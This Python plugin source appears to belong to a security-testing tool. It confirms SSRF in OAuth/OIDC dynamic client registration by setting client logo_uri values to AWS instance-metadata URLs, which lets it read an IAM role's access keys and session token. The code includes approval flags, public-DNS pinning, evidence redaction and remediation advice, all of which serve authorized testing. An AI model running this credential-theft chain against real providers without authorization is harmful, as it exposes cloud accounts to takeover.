"""Bounded OAuth/OIDC dynamic-registration SSRF confirmation.

The single supported mode derives the OAuth provider from an authorized,
workflow-owned provider origin and a live same-origin OAuth entry redirect. It
then performs exactly two dynamic client registrations whose ``logo_uri``
values are entirely tool-owned AWS IMDSv1 paths: one discovers a single IAM
role and the second reads that role's credential document. The agent never
connects to IMDS directly.

All application/provider hosts must resolve only to public addresses. Those
addresses are pinned for the lifetime of the request session so a later DNS
answer cannot redirect the agent itself to a private address. Callers cannot
provide an IAM role, metadata URL, provider endpoint, redirect URI, headers,
cookies, raw body, proxy, solution answer, host, port, or scheme.
"""

from __future__ import annotations

import asyncio
import hashlib
import ipaddress
import json
import math
import re
import secrets
import socket
from html import unescape
from html.parser import HTMLParser
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    MAX_RESPONSE_BYTES,
    REDACTED_RUNTIME_SECRET,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"openid-dynamic-registration-logo-ssrf-v1"}
ALLOWED_PROOF_LEVELS = {"metadata-proof", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
EXPECTED_METADATA_STEP_LABELS = (
    "oauth-provider-redirect",
    "oidc-discovery",
    "role-list-registration",
    "role-list-fetch",
    "role-credentials-registration",
    "role-credentials-fetch",
)
EXPECTED_LAB_STEP_LABELS = (
    "unsolved-baseline",
    *EXPECTED_METADATA_STEP_LABELS,
    "approved-solution-submit",
    "solved-confirmation",
)
EXPECTED_CARRIER_ROLES = {
    "unsolved-baseline": "none",
    "oauth-provider-redirect": "oauth-entry",
    "oidc-discovery": "oidc-discovery",
    "role-list-registration": "role-list-registration",
    "role-list-fetch": "role-list-client",
    "role-credentials-registration": "role-credentials-registration",
    "role-credentials-fetch": "role-credentials-client",
    "approved-solution-submit": "aws-secret-access-key",
    "solved-confirmation": "none",
}

OIDC_DISCOVERY_PATH = "/.well-known/openid-configuration"
AWS_ROLE_LIST_URL = (
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
)
MAX_EVIDENCE_CHARS = 65_000
MAX_MARKER_CHARS = 512
MAX_PATH_CHARS = 2_048
MAX_CLIENT_ID_CHARS = 512
MAX_ROLE_CHARS = 128
MAX_CREDENTIAL_CHARS = 4_096
MAX_DNS_ADDRESSES = 16
MAX_META_REFRESH_CHARS = 8_192
MAX_META_REFRESH_DELAY_SECONDS = 10.0

_ROLE_NAME = re.compile(r"^[A-Za-z0-9+=,.@_-]{1,128}$")
_CLIENT_ID = re.compile(r"^[A-Za-z0-9._~+/-]{3,512}$")
_META_REFRESH_DELAY = re.compile(r"^(?:0|[1-9][0-9]*)(?:\.[0-9]+)?$")
_COMPACT_TOKEN = re.compile(
    r"(?<![A-Za-z0-9_-])[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\."
    r"[A-Za-z0-9_-]{8,}(?![A-Za-z0-9_-])"
)
_PEM_BLOCK = re.compile(
    r"-----BEGIN [A-Z0-9 ]{1,64}-----.*?-----END [A-Z0-9 ]{1,64}-----",
    re.S,
)
_SENSITIVE_JSON_KEY = re.compile(
    r"^(?:client[_-]?secret|registration[_-]?access[_-]?token|access[_-]?token|"
    r"refresh[_-]?token|id[_-]?token|secret[_-]?access[_-]?key|access[_-]?key[_-]?id|"
    r"session[_-]?token|token|password|api[_-]?key|private[_-]?key)$",
    re.I,
)
_ALLOWED_PARAMETERS = {
    "target",
    "url",
    "providerOrigin",
    "mode",
    "proofLevel",
    "oauthEntryPath",
    "callbackPath",
    "logoFetchPathTemplate",
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
    "engagement",
    "allowUnsafeMethods",
    "dynamicRegistrationApproved",
    "sensitiveMetadataReadApproved",
    "stateChangeApproved",
    "timeoutSeconds",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}
_LAB_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
}


class OAuthProbeError(ValueError):
    """Raised when the bounded OAuth/OIDC proof cannot be established."""


class _MetaRefreshParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.refresh_tags: List[List[Tuple[str, Optional[str]]]] = []

    def handle_starttag(
        self,
        tag: str,
        attrs: List[Tuple[str, Optional[str]]],
    ) -> None:
        if tag.lower() != "meta":
            return
        http_equiv_values = [
            value
            for name, value in attrs
            if name.lower() == "http-equiv"
        ]
        if any(
            isinstance(value, str) and value.strip().lower() == "refresh"
            for value in http_equiv_values
        ):
            self.refresh_tags.append(attrs)


def _sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _safe_error_text(exc: Exception, secret_values: Iterable[Any] = ()) -> str:
    try:
        text = str(exc)
    except Exception:
        text = exc.__class__.__name__
    return _sanitize_http_text(text or exc.__class__.__name__, secret_values, 500)


def _normalized_origin(value: Any, *, https_only: bool = False) -> Optional[str]:
    if not isinstance(value, str):
        return None
    raw = value.strip()
    if raw != value or not raw or len(raw) > 4_096:
        return None
    try:
        parsed = urlsplit(raw)
        port = parsed.port
    except (TypeError, ValueError):
        return None
    if (
        parsed.scheme not in ({"https"} if https_only else {"http", "https"})
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
        or parsed.path not in {"", "/"}
    ):
        return None
    scheme = parsed.scheme.lower()
    host = parsed.hostname.lower()
    host_text = f"[{host}]" if ":" in host else host
    default_port = 443 if scheme == "https" else 80
    return f"{scheme}://{host_text}" + (f":{port}" if port and port != default_port else "")


def _origin_from_url(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    try:
        parsed = urlsplit(value)
        port = parsed.port
    except (TypeError, ValueError):
        return None
    if (
        parsed.scheme not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
    ):
        return None
    scheme = parsed.scheme.lower()
    host = parsed.hostname.lower()
    host_text = f"[{host}]" if ":" in host else host
    default_port = 443 if scheme == "https" else 80
    return f"{scheme}://{host_text}" + (f":{port}" if port and port != default_port else "")


def _strict_relative_path(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    raw = value
    if (
        not raw
        or raw != raw.strip()
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.startswith("//")
        or "//" in raw
        or any(character in raw for character in "\r\n\0\\%")
    ):
        return None
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme or parsed.netloc or parsed.query or parsed.fragment:
        return None
    if any(segment in {".", ".."} for segment in raw.split("/")):
        return None
    return raw


def validate_logo_fetch_path_template(value: Any) -> Optional[str]:
    if not isinstance(value, str) or value.count("{client_id}") != 1:
        return None
    if "{" in value.replace("{client_id}", "") or "}" in value.replace("{client_id}", ""):
        return None
    rendered = value.replace("{client_id}", "xasm-client-id")
    path = _strict_relative_path(rendered)
    if not path or not path.endswith("/logo"):
        return None
    if value.split("/")[-2:] != ["{client_id}", "logo"]:
        return None
    return value


def _bounded_marker(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    if (
        len(value) < 3
        or len(value) > MAX_MARKER_CHARS
        or value != value.strip()
        or any(character in value for character in "\r\n\0")
    ):
        return None
    return value


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unknown = sorted(str(key) for key in parameters if key not in _ALLOWED_PARAMETERS)
    if unknown:
        return False, f"unsupported parameter: {unknown[0]}"

    has_target = isinstance(parameters.get("target"), str) and bool(parameters["target"])
    has_url = isinstance(parameters.get("url"), str) and bool(parameters["url"])
    if has_target == has_url:
        return False, "exactly one of target or url is required"
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, (
            "target must be a credential-free HTTP(S) base URL without query or fragment"
        )
    if not _normalized_origin(parameters.get("providerOrigin"), https_only=True):
        return False, "providerOrigin must be a workflow-owned credential-free HTTPS origin"
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be openid-dynamic-registration-logo-ssrf-v1"

    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be metadata-proof or lab-state-change"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"
    if parameters.get("dynamicRegistrationApproved") is not True:
        return False, "dynamicRegistrationApproved=true is required"
    if parameters.get("sensitiveMetadataReadApproved") is not True:
        return False, "sensitiveMetadataReadApproved=true is required"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required because two clients are created"

    for field in ("oauthEntryPath", "callbackPath"):
        if not _strict_relative_path(parameters.get(field)):
            return False, f"{field} must be a bounded same-origin relative path"
    if not validate_logo_fetch_path_template(parameters.get("logoFetchPathTemplate")):
        return False, (
            "logoFetchPathTemplate must contain exactly one {client_id} segment "
            "and end with /logo"
        )
    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"

    if proof_level == "metadata-proof":
        unexpected = sorted(_LAB_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for lab-state-change"
        return True, ""

    if engagement not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    for field in ("statusPath", "solutionPath"):
        if not _strict_relative_path(parameters.get(field)):
            return False, f"{field} must be a bounded same-origin relative path"
    unsolved_marker = _bounded_marker(parameters.get("unsolvedMarker"))
    solved_marker = _bounded_marker(parameters.get("solvedMarker"))
    if not unsolved_marker or not solved_marker or unsolved_marker == solved_marker:
        return False, "unsolvedMarker and solvedMarker must be distinct bounded strings"
    return True, ""


def _strict_json_object(text: str, label: str) -> Dict[str, Any]:
    def reject_duplicates(pairs: Sequence[Tuple[str, Any]]) -> Dict[str, Any]:
        result: Dict[str, Any] = {}
        for key, value in pairs:
            if key in result:
                raise OAuthProbeError(f"{label} contains a duplicate JSON key")
            result[key] = value
        return result

    try:
        parsed = json.loads(
            text,
            object_pairs_hook=reject_duplicates,
            parse_constant=lambda value: (_ for _ in ()).throw(
                OAuthProbeError(f"{label} contains non-finite JSON")
            ),
        )
    except OAuthProbeError:
        raise
    except Exception as exc:
        raise OAuthProbeError(f"{label} is not strict JSON") from exc
    if not isinstance(parsed, dict):
        raise OAuthProbeError(f"{label} must be a JSON object")
    return parsed


def _same_origin_https_endpoint(value: Any, provider_origin: str, label: str) -> str:
    if not isinstance(value, str) or len(value) > 4_096:
        raise OAuthProbeError(f"{label} is missing or oversized")
    try:
        parsed = urlsplit(value)
    except Exception as exc:
        raise OAuthProbeError(f"{label} is not a valid URL") from exc
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
        or _origin_from_url(value) != provider_origin
    ):
        raise OAuthProbeError(
            f"{label} must be credential-free HTTPS on the authorized provider origin"
        )
    return value


def parse_oauth_provider_redirect(
    location: Any,
    target_origin: str,
    provider_origin: str,
    expected_callback_url: str,
) -> Dict[str, str]:
    if not isinstance(location, str) or not location or len(location) > 8_192:
        raise OAuthProbeError("OAuth entry did not return a bounded absolute Location")
    try:
        parsed = urlsplit(location)
    except Exception as exc:
        raise OAuthProbeError("OAuth entry Location is invalid") from exc
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.fragment
        or _origin_from_url(location) != provider_origin
        or provider_origin == target_origin
    ):
        raise OAuthProbeError(
            "OAuth entry redirect did not derive the exact authorized provider origin"
        )
    query = parse_qs(parsed.query, keep_blank_values=True, strict_parsing=True)
    for field in ("client_id", "redirect_uri", "response_type"):
        if len(query.get(field, [])) != 1 or not query[field][0]:
            raise OAuthProbeError(f"OAuth entry redirect requires one {field}")
    client_id = query["client_id"][0]
    if len(client_id) > MAX_CLIENT_ID_CHARS or any(
        character in client_id for character in "\r\n\0"
    ):
        raise OAuthProbeError("OAuth application client_id is outside the bounded contract")
    if query["response_type"][0] not in {"code", "token"}:
        raise OAuthProbeError("OAuth response_type must be code or token")
    redirect_uri = query["redirect_uri"][0]
    if (
        _origin_from_url(redirect_uri) != target_origin
        or redirect_uri != expected_callback_url
    ):
        raise OAuthProbeError(
            "OAuth redirect_uri did not match the workflow-owned callback URL"
        )
    return {
        "providerOrigin": provider_origin,
        "clientId": client_id,
        "redirectUri": redirect_uri,
        "responseType": query["response_type"][0],
    }


def extract_oauth_provider_location(response: Dict[str, Any]) -> str:
    """Extract one bounded OAuth redirect from a 3xx header or 200 meta refresh."""

    status = int(response.get("status") or 0)
    if status in range(300, 400):
        _assert_response(
            response,
            label="OAuth provider redirect",
            allowed_statuses=tuple(range(300, 400)),
        )
        location_values = _header_values(response.get("headers"), "Location")
        if len(location_values) != 1:
            raise OAuthProbeError(
                "OAuth entry must return exactly one Location header"
            )
        location = location_values[0]
    elif status == 200:
        _assert_response(
            response,
            label="OAuth provider transition",
            allowed_statuses=(200,),
        )
        if _header_values(response.get("headers"), "Location"):
            raise OAuthProbeError(
                "OAuth entry 200 response cannot mix Location and meta refresh"
            )
        body = response.get("body")
        if not isinstance(body, str):
            raise OAuthProbeError("OAuth entry 200 response must contain HTML")
        parser = _MetaRefreshParser()
        try:
            parser.feed(body)
            parser.close()
        except Exception as exc:
            raise OAuthProbeError("OAuth entry meta refresh HTML is invalid") from exc
        if len(parser.refresh_tags) != 1:
            raise OAuthProbeError(
                "OAuth entry must contain exactly one meta refresh"
            )

        attrs = parser.refresh_tags[0]
        http_equiv_values = [
            value for name, value in attrs if name.lower() == "http-equiv"
        ]
        content_values = [
            value for name, value in attrs if name.lower() == "content"
        ]
        if (
            len(http_equiv_values) != 1
            or not isinstance(http_equiv_values[0], str)
            or http_equiv_values[0].strip().lower() != "refresh"
            or len(content_values) != 1
            or not isinstance(content_values[0], str)
        ):
            raise OAuthProbeError("OAuth entry meta refresh attributes are invalid")

        content = content_values[0]
        if (
            not content
            or len(content) > MAX_META_REFRESH_CHARS
            or any(character in content for character in "\r\n\0")
        ):
            raise OAuthProbeError("OAuth entry meta refresh content is outside bounds")
        delay_text, separator, target_text = content.partition(";")
        target_key, equals, location_text = target_text.partition("=")
        delay_text = delay_text.strip()
        if (
            separator != ";"
            or not _META_REFRESH_DELAY.fullmatch(delay_text)
            or target_key.strip().lower() != "url"
            or equals != "="
        ):
            raise OAuthProbeError("OAuth entry meta refresh content is invalid")
        delay = float(delay_text)
        if (
            not math.isfinite(delay)
            or delay < 0
            or delay > MAX_META_REFRESH_DELAY_SECONDS
        ):
            raise OAuthProbeError("OAuth entry meta refresh delay is outside bounds")

        location = location_text.strip()
        if location[:1] in {"'", '"'}:
            quote_character = location[0]
            if len(location) < 2 or location[-1] != quote_character:
                raise OAuthProbeError("OAuth entry meta refresh URL quoting is invalid")
            location = location[1:-1]
        if (
            not location
            or len(location) > MAX_META_REFRESH_CHARS
            or any(character in location for character in "\r\n\0'\"")
        ):
            raise OAuthProbeError("OAuth entry meta refresh URL is outside bounds")
        try:
            parsed = urlsplit(location)
        except Exception as exc:
            raise OAuthProbeError("OAuth entry meta refresh URL is invalid") from exc
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            raise OAuthProbeError("OAuth entry meta refresh URL must be absolute")
    else:
        raise OAuthProbeError("OAuth provider redirect returned an unexpected status")

    if (
        not location
        or len(location) > MAX_META_REFRESH_CHARS
        or any(character in location for character in "\r\n\0")
    ):
        raise OAuthProbeError("OAuth entry redirect Location is outside bounds")
    return location


def parse_oidc_discovery(body: str, provider_origin: str) -> str:
    document = _strict_json_object(body, "OIDC discovery response")
    return _same_origin_https_endpoint(
        document.get("registration_endpoint"),
        provider_origin,
        "registration_endpoint",
    )


def _collect_sensitive_json_values(value: Any, parent_key: str = "") -> List[str]:
    secrets_found: List[str] = []
    if isinstance(value, dict):
        for key, child in value.items():
            if _SENSITIVE_JSON_KEY.search(str(key)) and isinstance(child, (str, int)):
                rendered = str(child)
                if len(rendered) >= 3:
                    secrets_found.append(rendered)
            secrets_found.extend(_collect_sensitive_json_values(child, str(key)))
    elif isinstance(value, list):
        for child in value:
            secrets_found.extend(_collect_sensitive_json_values(child, parent_key))
    return secrets_found


def parse_registration_response(body: str) -> Tuple[str, List[str]]:
    document = _strict_json_object(body, "dynamic registration response")
    if len(document) > 64:
        raise OAuthProbeError("dynamic registration response has too many fields")
    client_id = document.get("client_id")
    if (
        not isinstance(client_id, str)
        or _CLIENT_ID.fullmatch(client_id) is None
        or len(client_id) > MAX_CLIENT_ID_CHARS
    ):
        raise OAuthProbeError("dynamic registration response lacks a bounded client_id")
    sensitive = [client_id, *_collect_sensitive_json_values(document)]
    return client_id, list(dict.fromkeys(sensitive))


def parse_single_role(body: str) -> str:
    role = body.strip()
    if (
        not role
        or len(role) > MAX_ROLE_CHARS
        or _ROLE_NAME.fullmatch(role) is None
        or len([line for line in body.splitlines() if line.strip()]) != 1
    ):
        raise OAuthProbeError("role-list fetch did not return exactly one bounded IAM role")
    return role


def parse_credential_document(body: str) -> Dict[str, str]:
    document = _strict_json_object(body, "role credential response")
    if len(document) > 64 or any(isinstance(value, (dict, list)) for value in document.values()):
        raise OAuthProbeError("role credential response exceeds the flat bounded contract")
    access_key_id = document.get("AccessKeyId")
    secret_access_key = document.get("SecretAccessKey")
    session_token = document.get("Token")
    if (
        not isinstance(access_key_id, str)
        or not 8 <= len(access_key_id) <= 256
        or any(character in access_key_id for character in "\r\n\0")
        or not isinstance(secret_access_key, str)
        or not 16 <= len(secret_access_key) <= 256
        or any(character in secret_access_key for character in "\r\n\0")
        or not isinstance(session_token, str)
        or not 8 <= len(session_token) <= MAX_CREDENTIAL_CHARS
        or any(character in session_token for character in "\r\n\0")
    ):
        raise OAuthProbeError(
            "role credential response lacks bounded AWS credential fields"
        )
    result = {
        "AccessKeyId": access_key_id,
        "SecretAccessKey": secret_access_key,
        "Token": session_token,
    }
    return result


def build_registration_body(client_name: str, redirect_uri: str, logo_uri: str) -> str:
    return json.dumps(
        {
            "client_name": client_name,
            "logo_uri": logo_uri,
            "redirect_uris": [redirect_uri],
        },
        ensure_ascii=False,
        separators=(",", ":"),
        sort_keys=True,
    )


def _sanitize_http_text(
    text: Any,
    secret_values: Iterable[Any] = (),
    max_chars: int = MAX_EVIDENCE_CHARS,
) -> str:
    sanitized = sanitize_evidence_text(text, secret_values, max_chars)
    sanitized = _COMPACT_TOKEN.sub(REDACTED_RUNTIME_SECRET, sanitized)
    sanitized = _PEM_BLOCK.sub(REDACTED_RUNTIME_SECRET, sanitized)
    return sanitized


def _sanitize_json_body(
    body: str,
    secret_values: Iterable[Any],
) -> Optional[str]:
    try:
        document = json.loads(body)
    except Exception:
        return None

    secrets = sorted(
        {
            str(value)
            for value in secret_values
            if value is not None and len(str(value)) >= 3
        },
        key=len,
        reverse=True,
    )

    def sanitize_scalar(value: str) -> str:
        sanitized = value.replace("\0", "")
        for secret in secrets:
            sanitized = sanitized.replace(secret, REDACTED_RUNTIME_SECRET)
        sanitized = _COMPACT_TOKEN.sub(REDACTED_RUNTIME_SECRET, sanitized)
        sanitized = _PEM_BLOCK.sub(REDACTED_RUNTIME_SECRET, sanitized)
        return sanitized

    def sanitize_value(value: Any) -> Any:
        if isinstance(value, dict):
            sanitized_object: Dict[str, Any] = {}
            for key, child in value.items():
                if _SENSITIVE_JSON_KEY.fullmatch(str(key)) and isinstance(
                    child,
                    (str, int),
                ):
                    sanitized_object[str(key)] = REDACTED_RUNTIME_SECRET
                else:
                    sanitized_object[str(key)] = sanitize_value(child)
            return sanitized_object
        if isinstance(value, list):
            return [sanitize_value(child) for child in value]
        if isinstance(value, str):
            return sanitize_scalar(value)
        return value

    return json.dumps(
        sanitize_value(document),
        ensure_ascii=False,
    )


def _request_transcript(
    method: str,
    url: str,
    body: str,
    content_type: str,
    secret_values: Iterable[Any],
) -> str:
    parsed = urlsplit(url)
    sanitized_path = _sanitize_http_text(
        _path_and_query(url),
        secret_values,
    )
    sanitized_body = _sanitize_http_text(
        body,
        secret_values,
    )
    lines = [
        f"{method} {sanitized_path} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-OAuth-Probe/1.0",
        "Accept: application/json,text/html,text/plain",
    ]
    if body:
        lines.extend(
            [
                f"Content-Type: {content_type}",
                f"Content-Length: {len(sanitized_body.encode('utf-8'))}",
            ]
        )
    return "\r\n".join(lines) + "\r\n\r\n" + sanitized_body


def _header_values(headers: Any, name: str) -> List[str]:
    if headers is None:
        return []
    try:
        return [str(value) for value in headers.getall(name, [])]
    except AttributeError:
        value = headers.get(name) if hasattr(headers, "get") else None
        return [] if value is None else [str(value)]


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Tuple[str, bool]:
    reason = str(response.get("reason") or "").replace("\r", "").replace("\n", "")[:100]
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {reason}"]
    for name in ("Content-Type", "Content-Length", "Cache-Control", "Location", "Set-Cookie"):
        for value in _header_values(response.get("headers"), name):
            lines.append(f"{name}: {value}")
    body = str(response.get("body") or "")
    content_types = _header_values(response.get("headers"), "Content-Type")
    sanitized_json_body = (
        _sanitize_json_body(body, secret_values)
        if len(content_types) == 1
        and content_types[0].split(";", 1)[0].strip().lower() == "application/json"
        else None
    )
    sanitized_head = _sanitize_http_text("\r\n".join(lines), secret_values)
    sanitized_body = (
        sanitized_json_body
        if sanitized_json_body is not None
        else _sanitize_http_text(body, secret_values)
    )
    raw = sanitized_head + "\r\n\r\n" + sanitized_body
    oversized = len(raw.encode("utf-8", errors="replace")) > MAX_EVIDENCE_CHARS
    return raw, bool(response.get("truncated")) or oversized or len(
        raw.encode("utf-8")
    ) > MAX_EVIDENCE_CHARS


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    content_type: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, content_type, secret_values)
    response_text, truncated = _response_transcript(response, secret_values)
    response_body = (
        response_text.split("\r\n\r\n", 1)[1]
        if "\r\n\r\n" in response_text
        else ""
    )
    return {
        "label": label,
        "carrierRole": EXPECTED_CARRIER_ROLES[label],
        "request": request,
        "requestSha256": _sha256_text(request),
        "response": response_text,
        "responseSha256": _sha256_text(response_text),
        "responseBodySha256": _sha256_text(response_body),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def _response_has_marker(response: Dict[str, Any], marker: str) -> bool:
    body = str(response.get("body") or "")
    return marker in body or marker in unescape(body)


def _assert_response(
    response: Dict[str, Any],
    *,
    label: str,
    allowed_statuses: Sequence[int],
) -> None:
    if response.get("truncated"):
        raise OAuthProbeError(f"{label} response was truncated")
    if int(response.get("status") or 0) not in allowed_statuses:
        raise OAuthProbeError(f"{label} returned an unexpected status")


async def _resolve_public_addresses(url: str) -> List[Tuple[str, int]]:
    parsed = urlsplit(url)
    hostname = parsed.hostname
    if not hostname:
        raise OAuthProbeError("authorized origin has no hostname")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        literal = ipaddress.ip_address(hostname)
        resolved = [(str(literal), socket.AF_INET6 if literal.version == 6 else socket.AF_INET)]
    except ValueError:
        loop = asyncio.get_running_loop()
        try:
            infos = await loop.getaddrinfo(
                hostname,
                port,
                family=socket.AF_UNSPEC,
                type=socket.SOCK_STREAM,
            )
        except Exception as exc:
            raise OAuthProbeError("authorized origin DNS resolution failed") from exc
        resolved = []
        for family, _socktype, _proto, _canonname, sockaddr in infos:
            address = str(sockaddr[0])
            entry = (address, family)
            if entry not in resolved:
                resolved.append(entry)

    if not resolved or len(resolved) > MAX_DNS_ADDRESSES:
        raise OAuthProbeError("authorized origin DNS answer count is outside bounds")
    for address, _family in resolved:
        try:
            parsed_address = ipaddress.ip_address(address)
        except ValueError as exc:
            raise OAuthProbeError("authorized origin DNS returned a non-IP answer") from exc
        if not parsed_address.is_global:
            raise OAuthProbeError("authorized origin DNS returned a non-public address")
    return resolved


class PinnedPublicResolver(aiohttp.abc.AbstractResolver):
    """Resolve only prevalidated public addresses for the request session."""

    def __init__(self, pins: Dict[str, List[Tuple[str, int]]]):
        self._pins = {host.lower(): list(addresses) for host, addresses in pins.items()}

    async def resolve(
        self,
        host: str,
        port: int = 0,
        family: int = socket.AF_INET,
    ) -> List[Dict[str, Any]]:
        addresses = self._pins.get(host.lower())
        if not addresses:
            raise OSError("hostname is outside the pinned OAuth proof origins")
        selected = [
            (address, address_family)
            for address, address_family in addresses
            if family in {socket.AF_UNSPEC, address_family}
        ]
        if not selected:
            selected = addresses
        return [
            {
                "hostname": host,
                "host": address,
                "port": port,
                "family": address_family,
                "proto": 0,
                "flags": socket.AI_NUMERICHOST,
            }
            for address, address_family in selected
        ]

    async def close(self) -> None:
        return None


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-oauth-oidc-dynamic-registration-ssrf-verified",
        "matcher-name": "openid-dynamic-registration-logo-ssrf",
        "type": "http",
        "host": target,
        "matched-at": str(
            verification.get("registrationEndpoint")
            or verification.get("providerOrigin")
            or target
        ),
        "info": {
            "name": "Verified OAuth/OIDC SSRF via Dynamic Client Registration",
            "severity": "high",
            "description": (
                "An OAuth/OIDC provider fetched tool-owned AWS metadata URLs from "
                "dynamically registered client logo metadata and returned a bounded "
                "credential-shaped response."
            ),
            "remediation": (
                "Require authenticated and authorized dynamic registration, validate "
                "and canonicalize every client metadata URL, block private/link-local "
                "destinations after DNS resolution and redirects, and isolate provider "
                "fetchers from cloud metadata services."
            ),
            "classification": {"cwe-id": ["CWE-918"]},
        },
        "evidence": verification,
    }


class OAuthProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:oauth_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one bounded OAuth/OIDC dynamic-registration logo SSRF with "
            "workflow-authorized provider origin, public-DNS pinning, tool-owned AWS "
            "role discovery, complete redacted evidence, and optional approved lab solve."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        lab_fields = sorted(_LAB_PARAMETERS)
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "providerOrigin": {
                    "type": "string",
                    "x-hidden": True,
                    "x-workflow-owned": True,
                },
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {
                    "type": "string",
                    "enum": sorted(ALLOWED_PROOF_LEVELS),
                },
                "oauthEntryPath": {"type": "string"},
                "callbackPath": {"type": "string"},
                "logoFetchPathTemplate": {"type": "string"},
                "statusPath": {"type": "string"},
                "unsolvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "solvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "solutionPath": {"type": "string"},
                "engagement": {
                    "type": "string",
                    "enum": sorted(ALLOWED_ENGAGEMENTS),
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "dynamicRegistrationApproved": {"type": "boolean", "default": False},
                "sensitiveMetadataReadApproved": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
            },
            "required": [
                "providerOrigin",
                "mode",
                "proofLevel",
                "oauthEntryPath",
                "callbackPath",
                "logoFetchPathTemplate",
                "engagement",
                "allowUnsafeMethods",
                "dynamicRegistrationApproved",
                "sensitiveMetadataReadApproved",
                "stateChangeApproved",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {
                        "properties": {
                            "proofLevel": {"const": "lab-state-change"},
                        }
                    },
                    "then": {"required": lab_fields},
                    "else": {
                        "not": {
                            "anyOf": [{"required": [field]} for field in lab_fields]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "workflow"],
            "output_type": ["findings", "oauth_oidc_ssrf_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm OAuth/OIDC dynamic-registration logo SSRF",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        body: str = "",
        content_type: str = "",
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-OAuth-Probe/1.0",
            "Accept": "application/json,text/html,text/plain",
        }
        if body:
            headers["Content-Type"] = content_type
        async with session.request(
            method,
            url,
            headers=headers,
            data=body if body else None,
            allow_redirects=False,
            ssl=True,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
                "redirected": bool(response.history),
            }

